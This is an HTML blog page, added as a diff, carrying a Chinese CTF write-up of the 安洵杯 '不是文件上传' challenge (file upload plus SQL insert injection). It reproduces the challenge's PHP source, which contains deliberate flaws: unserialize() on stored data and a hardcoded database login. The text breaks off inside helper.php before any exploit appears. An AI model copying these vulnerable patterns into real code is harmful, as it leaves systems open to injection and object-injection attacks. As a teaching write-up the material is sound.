@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] [安洵杯-不是文件上传]代码审计+文件上传+insert注入首页是一个文件上传页面  测试只能上传图片，是白名单 题目给出了源码： upload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/[%E5%AE%89%E6%B4%B5%E6%9D%AF-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0]%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+insert%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] [安洵杯-不是文件上传]代码审计+文件上传+insert注入首页是一个文件上传页面  测试只能上传图片，是白名单 题目给出了源码： upload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;h">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311246372.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311310402.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311316941.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311316705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311327731.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.346Z">
+<meta property="article:modified_time" content="2023-07-31T05:33:44.529Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311246372.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          98 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年7月31日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="安洵杯-不是文件上传-代码审计-文件上传-insert注入"><a href="#安洵杯-不是文件上传-代码审计-文件上传-insert注入" class="headerlink" title="[安洵杯-不是文件上传]代码审计+文件上传+insert注入"></a>[安洵杯-不是文件上传]代码审计+文件上传+insert注入</h2><p>首页是一个文件上传页面</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311246372.png" srcset="/img/loading.gif" lazyload alt="image-20230731124554241"></p>
+<p>测试只能上传图片，是白名单</p>
+<p>题目给出了源码：</p>
+<p>upload.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Image Upload&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p align=<span class="hljs-string">&quot;center&quot;</span>&gt;&lt;img src=<span class="hljs-string">&quot;https://i.loli.net/2019/10/06/i5GVSYnB1mZRaFj.png&quot;</span> width=<span class="hljs-number">300</span> length=<span class="hljs-number">150</span>&gt;&lt;/p&gt;<br>&lt;div align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br>    &lt;form name=<span class="hljs-string">&quot;upload&quot;</span> action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;Submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>&lt;/div&gt;<br><br>&lt;br&gt;<br>&lt;p&gt;&lt;a href=<span class="hljs-string">&quot;./show.php&quot;</span>&gt;You can view the pictures you uploaded here&lt;/a&gt;&lt;/p&gt;<br>&lt;br&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_base</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file failed.&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br>        <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">upload_base</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>show.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>	&lt;title&gt;Show Images&lt;/title&gt;<br>	&lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;<br>	&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;h2 align=<span class="hljs-string">&quot;center&quot;</span>&gt;Your images&lt;/h2&gt;<br>&lt;p&gt;The <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">of</span> <span class="hljs-title">viewing</span> <span class="hljs-title">the</span> <span class="hljs-title">image</span> <span class="hljs-title">has</span> <span class="hljs-title">not</span> <span class="hljs-title">been</span> <span class="hljs-title">completed</span>, <span class="hljs-title">and</span> <span class="hljs-title">currently</span> <span class="hljs-title">only</span> <span class="hljs-title">the</span> <span class="hljs-title">contents</span> <span class="hljs-title">of</span> <span class="hljs-title">your</span> <span class="hljs-title">image</span> <span class="hljs-title">name</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">saved</span>. <span class="hljs-title">I</span> <span class="hljs-title">hope</span> <span class="hljs-title">you</span> <span class="hljs-title">can</span> <span class="hljs-title">forgive</span> <span class="hljs-title">me</span> <span class="hljs-title">and</span> <span class="hljs-title">my</span> <span class="hljs-title">colleagues</span> <span class="hljs-title">and</span> <span class="hljs-title">I</span> <span class="hljs-title">are</span> <span class="hljs-title">working</span> <span class="hljs-title">hard</span> <span class="hljs-title">to</span> <span class="hljs-title">improve</span>.&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-function">&lt;<span class="hljs-title">hr</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-function"><span class="hljs-title">include</span>(<span class="hljs-params"><span class="hljs-string">&quot;./helper.php&quot;</span></span>)</span>;<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>])&#123;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>] == <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>		<span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Delete_All_Images</span>();<br>	&#125;<br>&#125;<br><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Get_All_Images</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$con</span>;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;con = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$this</span>-&gt;con))&#123;<br>   			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>		    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>())&#123;<br>		    	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br>		    		<span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br>					<span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>				&#125;<br>		        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>		    &#125;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>		    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;<br>		&#125;<br>		<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$this</span>-&gt;con);<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Delete_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DELETE FROM images&quot;</span>;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;p&gt;&lt;a href=<span class="hljs-string">&quot;show.php?delete_all=true&quot;</span>&gt;Delete All Images&lt;/a&gt;&lt;/p&gt;<br>&lt;p&gt;&lt;a href=<span class="hljs-string">&quot;upload.php&quot;</span>&gt;Upload Images&lt;/a&gt;&lt;/p&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>helper.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br>	<span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span><br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>=<span class="hljs-string">&quot;file&quot;</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$fileinfo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getfile</span>(<span class="hljs-variable">$input</span>);<br>		<span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;title&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;filename&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;ext&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;ext&#x27;</span>];<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;path&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>		<span class="hljs-variable">$img_ext</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>		<span class="hljs-variable">$my_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">1</span>]);<br>		<span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$my_ext</span>);<br>		<span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$array</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> == <span class="hljs-number">0</span>)&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br>			<span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);<br>		&#125;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br>		<span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>		<span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>		<span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ 